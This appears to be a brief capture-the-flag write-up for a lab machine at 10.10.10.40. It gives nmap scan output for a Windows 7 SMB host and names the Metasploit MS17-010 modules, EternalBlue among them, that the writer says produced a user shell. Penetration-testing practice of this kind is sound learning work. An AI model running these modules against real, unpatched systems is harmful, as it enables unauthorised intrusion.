Target: 10.10.10.40

`nmap -sC -sV -A 10.10.10.40 `
Nmap scan report for 10.10.10.40
Host is up (0.24s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  microsof    Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc       Microsoft Windows RPC
49153/tcp open  msrpc       Microsoft Windows RPC
49154/tcp open  msrpc       Microsoft Windows RPC
49155/tcp open  msrpc       Microsoft Windows RPC
49156/tcp open  msrpc       Microsoft Windows RPC
49157/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: 9s, deviation: 2s, median: 8s
| smb2-time: 
|   date: 2023-10-30T10:20:52
|_  start_date: 2023-10-30T10:10:58
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-10-30T10:20:51+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Using metasploit
`msfdb init && msfconsole`
auxiliary/admin/smb/ms17_010_command
auxiliary/scanner/smb/smb_ms17_010
exploit/windows/smb/ms17_010_eternalblue

using both of the auxiliaries and the exploit from metasploit, i'm able to have access to the user shell.
The vulnerability (https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010) are found from the old Windows 7 that are being use by the target.